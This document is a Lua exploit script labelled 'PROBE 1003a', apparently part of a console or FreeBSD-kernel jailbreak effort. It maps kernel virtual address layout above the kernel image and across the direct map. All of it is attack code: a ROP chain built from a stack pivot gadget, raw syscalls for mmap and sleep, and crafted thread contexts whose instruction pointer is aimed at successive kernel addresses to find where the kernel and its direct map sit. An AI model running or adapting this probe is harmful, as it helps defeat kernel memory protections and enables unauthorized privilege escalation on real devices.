-- CRASH_CLASS: HIGH
-- PROBE 1003a: the rest of the kernel half and a sample of the direct map
--
-- 1002a fixed the image at 0xFFFFFFFF91800000..0xFFFFFFFF979FFFFF. This run covers
-- what sits above the image (0xFFFFFFFFC0000000 upward at 2 MB) and samples the
-- canonical direct-map base (0xFFFF800000000000 upward at 4 GB).

local RUNS = {
    { base = 0xFFFFFFFFC0000000, step = 0x200000,   count = 512 },
    { base = 0xFFFF800000000000, step = 0x100000000, count = 128 },
}
local SLEEP = 20

print("=== PROBE 1003a: KVA LAYOUT ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end

print(string.format("[0] pid=%u fd=%u", to_num(mk(20)()), rd(signal.fd_addr) or 0))
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x40)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0x100)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
chain:push_syscall_raw(mk(431), function() chain:push_set_rdi(0) end)

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local block = mmap(page*4)
local start = block + page*4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local ctxa = as_addr(ctx)
print(string.format("[1] block=0x%X ctx=0x%X", block, ctxa))
local ua = uint64 and uint64 or function(x) return x end
local function U(x) return uint64(string.format("0x%X", x)) end

local n = 0
for ri, run in ipairs(RUNS) do
    print(string.format("[R%d] base=0x%X step=0x%X count=%u", ri, run.base, run.step, run.count))
    for i = 0, run.count - 1 do
        local t = run.base + i*run.step
        for o=0,0x4F8,8 do wq(ctxa+o,0) end
        wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
        wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
        wq(ctxa+Ctx.RIP,t); wq(ctxa+Ctx.RSP,start)
        wq(as_addr(tb),0)
        print(string.format("[P%04d] 0x%X", n, t))
        pcall(function() mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
        wq(as_addr(ts),0); wq(as_addr(ts)+8,SLEEP*1000000)
        pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
        n = n + 1
    end
end
print(string.format("[E] probes=%u alive pid=%u", n, to_num(mk(20)())))
print("=== COMPLETE ===")
